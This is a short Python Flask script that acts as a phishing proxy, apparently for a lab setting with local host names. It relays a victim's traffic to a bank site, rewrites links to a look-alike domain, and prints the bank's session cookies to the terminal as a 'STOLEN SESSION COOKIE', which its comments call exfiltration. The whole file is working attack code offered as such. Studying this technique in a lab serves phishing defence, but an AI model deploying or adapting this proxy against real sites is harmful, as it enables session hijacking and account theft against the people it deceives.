from flask import Flask, request, Response, redirect
import requests

app = Flask(__name__)

# Real server the proxy relays traffic to.
REAL_SERVER = "http://bank.local:5000"


@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def proxy(path):
    url = f"{REAL_SERVER}/{path}"

    resp = requests.request(
        method=request.method,
        url=url,
        data=request.get_data(),
        headers={k: v for k, v in request.headers if k.lower() != 'host'},
        cookies=request.cookies,
        allow_redirects=False
    )

    html_content = resp.content.decode('utf-8', errors='ignore')

    # Rewrite links so the victim stays on the phishing domain.
    modified_content = html_content.replace("bank.local:5000", "secure-bank.local:5001")

    # When the real server sets a session cookie, print it to the terminal — this is the exfiltration.
    if 'Set-Cookie' in resp.headers:
        print("\n" + "!" * 40)
        print("SUCCESS: STOLEN SESSION COOKIE BELOW")
        print(resp.headers['Set-Cookie'])
        print("!" * 40 + "\n")

    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.headers.items()
               if name.lower() not in excluded_headers]

    return Response(modified_content.encode('utf-8'), resp.status_code, headers)


if __name__ == '__main__':
    app.run(port=5001, debug=True)
